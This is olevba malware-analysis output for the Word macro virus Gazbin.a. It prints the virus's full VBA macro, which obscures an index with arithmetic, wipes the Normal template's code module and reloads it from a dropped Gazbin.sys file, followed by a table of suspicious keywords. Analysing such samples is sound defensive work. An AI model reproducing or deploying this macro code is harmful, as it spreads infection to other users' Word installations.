olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gazbin.a-d64c729fb43eb79b2b4a5ef9b5a71b73acff1b9c
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Gazbin.a-d64c729fb43eb79b2b4a5ef9b5a71b73acff1b9c 
in file: Virus.MSWord.Gazbin.a-d64c729fb43eb79b2b4a5ef9b5a71b73acff1b9c - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
On error resume next
GazBin_Null = (Sin(Rnd * False) + Tan(Rnd * False)) * False
Gazbin_One = ((Tan(Rnd * GazBin_Null) + Fix(Rnd * GazBin_Null)) * GazBin_Null) + Fix(GazBin_Null + 1)
Set wrd = CreateoBject("Word.Application")
with wrd.normaltemplate.vbproject.vbcomponents(Gazbin_One).codemodule
Gazbin_AllLines = .CountOfLines
.Deletelines Gazbin_One, Gazbin_AllLines
.Addfromfile "C:\WINDOWS\system\Gazbin.sys"
end with
wrd.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateoBject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|vbproject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

